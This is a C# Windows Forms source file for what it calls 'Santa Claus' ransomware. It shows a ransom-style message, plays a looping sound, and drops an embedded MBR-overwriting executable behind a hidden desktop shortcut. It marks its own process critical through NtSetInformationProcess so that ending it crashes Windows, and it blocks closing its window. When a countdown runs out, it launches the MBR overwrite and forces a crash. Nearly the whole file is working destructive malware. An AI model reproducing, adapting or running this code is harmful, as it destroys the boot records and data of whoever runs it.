using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Reflection;
using IWshRuntimeLibrary;

namespace SantaClausWillKillYourPC
{
    public partial class SantaClausKillPC : Form
    {
        SoundPlayer santaclaus = new SoundPlayer();
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            //This is Very Important Code... DON'T CHANGE THIS!!! 

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
        public SantaClausKillPC()
        {
            MessageBox.Show("Santa Claus is Now Hate You, Because you don't pay me or password is INCORRECT, Nice Work Man :D", "Santa Claus Killer PC", MessageBoxButtons.OK, MessageBoxIcon.Information);
            Directory.CreateDirectory(@"C:\Temp\Santa Claus Killer");
            InitializeComponent();
            Extract("SantaClausWillKillYourPC", @"C:\Temp\Santa Claus Killer", "Resources", "MelancholiaSantaClaus.wav");
            Extract("SantaClausWillKillYourPC", @"C:\Temp\Santa Claus Killer", "Resources", "MBROverwrite.exe");
            santaclaus = new SoundPlayer(@"C:\Temp\Santa Claus Killer\MelancholiaSantaClaus.wav");
            santaclaus.PlayLooping();
            ShortcutCreateMBR();
            int isCritical = 1;  // we want this to be a Critical Process
            int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
            Process.EnterDebugMode();  //acquire Debug Privileges
            // setting the BreakOnTermination = 1 for the current process
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
        }

        private void SantaClausKillPC_Load(object sender, EventArgs e)
        {
            TimertoDeathYourPC();
        }

        private void TimertoDeathYourPC()
        {
            CountdownTimer.Start();
            var TimeStart = DateTime.Now;
            var intervaltimer = new Timer() { Interval = 1000 };
            intervaltimer.Tick += (obj, args) =>
            timertodeathpc.Text =
            (TimeSpan.FromMinutes(10) - (DateTime.Now - TimeStart))
            .ToString("hh\\:mm\\:ss");
            intervaltimer.Start();
            intervaltimer.Enabled = true;
        }

        private void ShortcutCreateMBR()
        {
            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            WshShell wsh = new WshShell();
            IWshShortcut shortcut = wsh.CreateShortcut(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"/MBROverwrite.lnk") as IWshShortcut;
            shortcut.TargetPath = @"C:\Temp\Santa Claus Killer\MBROverwrite.exe";
            shortcut.Arguments = "-BypassWarning";
            shortcut.WorkingDirectory = @"C:\Temp\Santa Claus Killer";
            shortcut.Save();
            FileInfo fileInfo = new FileInfo(desktop + @"/MBROverwrite.lnk");
            fileInfo.Attributes = FileAttributes.Hidden;
        }
        private void BSOD()
        {
            Environment.Exit(-750);
        }

        private void SantaClausKillPC_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            MessageBox.Show("Santa Claus will not give you to close this ransomware", "Santa Claus Killer PC", MessageBoxButtons.OK, MessageBoxIcon.None);
        }

        private void CountdownTimer_Tick(object sender, EventArgs e)
        {
            if(CountdownTimer.Interval > 1000)
            {
                MessageBox.Show("Your PC is Already Dead" + Environment.NewLine + "Thank you for testing this ransomware, Made by Haulgames(Creator of this ransomware is GlebYoutuber)", "Santa Claus Killer PC", MessageBoxButtons.OK, MessageBoxIcon.Error);
                try
                {
                    string shortcutmbr = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"/MBROverwrite.lnk";
                    Process.Start(shortcutmbr);
                    MessageBox.Show("MBR is Overwritten", "Santa Claus Killer PC", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    BSOD();
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Error: " + ex.Message, "Santa Claus Killer PC", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }
        }
    }
}
